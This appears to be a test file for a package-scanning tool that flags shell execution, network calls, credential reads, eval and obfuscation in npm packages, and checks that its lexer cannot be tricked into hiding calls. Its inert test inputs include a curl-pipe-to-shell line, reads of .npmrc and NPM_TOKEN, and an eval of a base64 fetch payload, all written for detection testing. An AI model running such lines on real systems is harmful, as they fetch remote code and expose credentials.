// Precision of the source rules: evidence must support its label. Code rules match code, not comments or regex
// literals (apm-score-v4), and TypeScript types are erased. Since apm-score-v8 those are the only things the floor
// leaves out: every other match apm-score-v3 made in code or a string stands, confirmed, so several cases below show
// a false positive that v8 keeps on purpose (a definition named fetch, a string only compared, a data: URL), next to
// the proofs that rest on how the code is read. `possible` is left for what the tree sees and v3's rules did not.
// The second half checks that the lexer cannot be steered into hiding code. Payloads are inert stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, finalize, POINTS, POSSIBLE_POINTS, type Analysis, type TarEntry } from "../src/index.ts";
import { scanText, type CodeSignal, type Confidence, type Lang } from "../src/source.ts";

type Found = Partial<Record<CodeSignal, Confidence>>;

/** The strongest confidence each signal reached. */
function found(text: string, lang: Lang = "js"): Found {
  const out: Found = {};

  for (const f of scanText(text, lang)) if (out[f.id] !== "confirmed") out[f.id] = f.confidence;

  return out;
}

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function analyzeFiles(files: Record<string, string>, main = "index.js"): Analysis {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main };

  return analyze({ name: "probe-pkg", manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] });
}

// hono@4.13.18 dist/jsx/base.js:10, verbatim. `|sh|` inside the regex literal matched the pipe-to-shell rule.
const HONO_BASE_10 =
  'const toSVGAttributeName = (key) => /[A-Z]/.test(key) && key.match(/^(?:al|basel|clip(?:Path|Rule)$|co|do|fill|fl|fo|gl|let|lig|i|marker[EMS]|o|pai|pointe|sh|st[or]|text[^L]|tr|u|ve|w)/) ? key.replace(/([A-Z])/g, "-$1").toLowerCase() : key;\n';

describe("evidence that does not support its label", () => {
  test("hono's SVG attribute regex is not a shell command", () => {
    expect(found(HONO_BASE_10)).toEqual({});
    const a = analyzeFiles({ "dist/jsx/base.js": HONO_BASE_10 }, "dist/jsx/base.js");
    expect(a.signals.map((s) => s.id)).not.toContain("shell-exec");
  });

  test("regex literals and prose comments never match", () => {
    expect(found("const plural = [/(x|ch|ss|sh)$/gi, '$1es'];\n")).toEqual({});
    // `|| sh` in code is not a pipe, but that rests on the tree, not on how the text is read: v3's verdict stands
    expect(found("if (pred[isOdd] < 0 || sh == 4) x();\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found("// CVE fix similar to curl (CVE-2022-32206).\nmodule.exports = 1;\n")).toEqual({});
    expect(found("/**\n * @example\n *   return fetch('http://backend', req)\n */\nexport const x = 1;\n")).toEqual({});
    expect(found("x(); // see `.fetch()`, the entry point\n")).toEqual({});
  });

  test("a call written inside an ordinary string counts as apm-score-v3 counted it, wherever the string goes", () => {
    // a string only compared is harmless only if comparing runs nothing, which a conversion hook can break
    expect(found('function f(e) { return e.message === "fetch() returned undefined" }\n')).toEqual({ network: "confirmed" });
    expect(found('function f() { const d = "Disallow the use of `eval()`"; }\n')).toEqual({ eval: "confirmed" });
    expect(found('throw new Error("fetch() returned undefined");\n')).toEqual({ network: "confirmed" });
  });

  test("a definition named like a call counts as apm-score-v3 counted it", () => {
    // a definition's name can be read back at runtime (`fn.name`, `Object.keys`) and handed to code that runs it
    expect(found("module.exports.fetch = function fetch (init, options) { return 1 };\n")).toEqual({ network: "confirmed" });
    expect(found("class A { async fetch(url) { return url } }\n")).toEqual({ network: "confirmed" });
  });

  test("a TypeScript type import never reaches the network; fetch of a data: URL counts as v3 counted it", () => {
    // a function named fetch need not be the builtin, and can turn a data: URL into a request
    expect(found("const R = (await fetch('data:,')).constructor;\n")).toEqual({ network: "confirmed" });
    expect(found("type R = NotAny<import('undici').RequestInit>;\n", "ts")).toEqual({});
  });

  test("long base64 and escape runs count as apm-score-v3 counted them, whatever they decode to", () => {
    const wasm = Buffer.concat([Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]), Buffer.alloc(3000, 7)]).toString("base64");
    expect(found(`const wasm = "${wasm}";\n`)).toEqual({ obfuscated: "confirmed" });
    expect(found(`const t = '${"\\xe1\\x01".repeat(40)}';\n`)).toEqual({ obfuscated: "confirmed" });
    // in a comment they are left out
    expect(found(`// ${wasm}\nmodule.exports = 1;\n`)).toEqual({});
  });

  test("JSON and type declarations are data: what they name is possible at most", () => {
    expect(found("{ \"tsType\": \"import('net').ListenOptions\" }", "data")).toEqual({});
    expect(found('declare const x: "child_process";\n', "data")).toEqual({ "shell-exec": "possible" });
  });
});

describe("confirmed versus possible", () => {
  test("a module name in code counts as apm-score-v3 counted it, loaded or only compared", () => {
    expect(found("const cp = require('child_process');\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found("import 'node:child_process';\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found('function isRunner(name) { return name === "child_process" }\n')).toEqual({ "shell-exec": "confirmed" });
    expect(found('const builtins = ["buffer", "child_process", "fs"];\n')).toEqual({ "shell-exec": "confirmed" });
  });

  test("shell text in a string counts as apm-score-v3 counted it", () => {
    expect(found("cp.exec('curl -s https://example.invalid/x | sh');\n")["shell-exec"]).toBe("confirmed");
    expect(found("function f() { const help = 'install with: curl -s https://example.invalid/x | sh'; }\n")["shell-exec"]).toBe("confirmed");
    expect(found("const help = 'install with: curl -s https://example.invalid/x | sh';\n")["shell-exec"]).toBe("confirmed");
  });

  test("a credential path counts as apm-score-v3 counted it, read or only held", () => {
    expect(found("fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n")).toEqual({ "credential-access": "confirmed" });
    expect(found('function root(dir) { const markers = ["package.json", ".npmrc"]; }\n')).toEqual({ "credential-access": "confirmed" });
    expect(found('const markers = ["package.json", ".npmrc"];\n')).toEqual({ "credential-access": "confirmed" });
    expect(found("const t = process.env.NPM_TOKEN;\n")).toEqual({ "credential-access": "confirmed" });
  });

  test("an alias of require and a method named fetch count as apm-score-v3 counted them", () => {
    // what they are cannot be proven, so the floor keeps v3's reading; the tree only says why it is unsure
    expect(found("aliasedRequire = require;\n")).toEqual({ eval: "confirmed" });
    expect(found("const r = await config.fetch(url);\n")).toEqual({ network: "confirmed" });
    expect(found("const r = await config.fetch('data:,');\n")).toEqual({ network: "confirmed" });
    expect(found("const r = await globalThis.fetch(url);\n")).toEqual({ network: "confirmed" });
  });

  test("a possible signal costs fewer points and says so in its label", () => {
    // possible is left for what the tree sees and v3's rules did not: here a braced escape only the parser decodes
    const a = analyzeFiles({ "index.js": 'module.exports = function () { const names = ["\\u{63}hild_process"]; };\n' });
    const s = a.signals.find((x) => x.id === "shell-exec");
    expect(s?.confidence).toBe("possible");
    expect(s?.points).toBe(POSSIBLE_POINTS["shell-exec"]);
    expect(s?.points).toBeGreaterThan(POINTS["shell-exec"]);
    expect(s?.label).toMatch(/^Possible/);
    expect(finalize(a, { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null }).score).toBe(100 + POSSIBLE_POINTS["shell-exec"] + POSSIBLE_POINTS.obfuscated);
  });

  test("one confirmed finding makes the signal confirmed and shows only confirmed evidence", () => {
    const a = analyzeFiles({ "index.js": 'const names = ["child_process"];\nrequire("./run");\n', "run.js": "require('child_process').execSync('id');\n" });
    const s = a.signals.find((x) => x.id === "shell-exec");
    expect(s?.confidence).toBe("confirmed");
    expect(s?.evidence.every((e) => !e.includes("possible"))).toBe(true);
  });

  test("a name joined from pieces counts as apm-score-v3 counted it, loaded or not", () => {
    expect(found("function f() { const n = 'chi' + 'ld_' + 'process'; }\n")["shell-exec"]).toBe("confirmed");
    expect(found("const n = 'chi' + 'ld_' + 'process';\n")["shell-exec"]).toBe("confirmed");
    expect(found("const cp = require('chi' + 'ld_' + 'process');\n")["shell-exec"]).toBe("confirmed");
  });
});

describe("the lexer cannot be steered into hiding code", () => {
  for (const [label, src] of [
    ["a division that looks like a regex", "const r = (a) / 2; require('child_process').execSync(c); const q = b / 3;\n"],
    ["a division after a function expression", "x = function(){} / require('child_process').execSync(c) / 1;\n"],
    ["a postfix increment before a division", "i++ / 2; require('child_process').execSync(c); j / 3;\n"],
    ["a non-ASCII identifier before a division", "const é = 1; x = é / require('child_process').execSync(c) / 1;\n"],
    ["a regex after an if header holding quotes", "if (1) /x'|'\\//.test(''); require('child_process').execSync(c); // '\n"],
    ["a template expression", "const s = `${require('child_process').execSync('id')}`;\n"],
    ["comment openers inside strings", "const s = '/*'; require('child_process').execSync(c); const t = '*/';\n"],
    ["an unbalanced bracket", "}); require('child_process').execSync(c);\n"],
    ["a stray quote in a file the lexer cannot follow", ") 'x; require(\"child_process\").execSync(c);\n"],
  ] as const) {
    test(`${label} does not hide a call`, () => {
      expect(found(src)["shell-exec"]).toBe("confirmed");
    });
  }

  test("JSX text cannot open a fake comment or string", () => {
    const a = analyzeFiles({ "index.jsx": "const a = <p>see http://x and it's here</p>; require('child_process').execSync(c);\n" }, "index.jsx");
    expect(a.signals.find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
  });

  test("a payload passed to eval stays confirmed", () => {
    const b64 = Buffer.from("fetch('https://example.invalid/c')").toString("base64");
    expect(found(`eval(atob('${b64}'));\n`)).toMatchObject({ network: "confirmed", obfuscated: "confirmed" });
  });

  test("install commands and shell scripts are read raw", () => {
    expect(found("curl -s https://example.invalid/x.sh | sh", "plain")).toMatchObject({ "shell-exec": "confirmed", network: "confirmed" });
  });
});
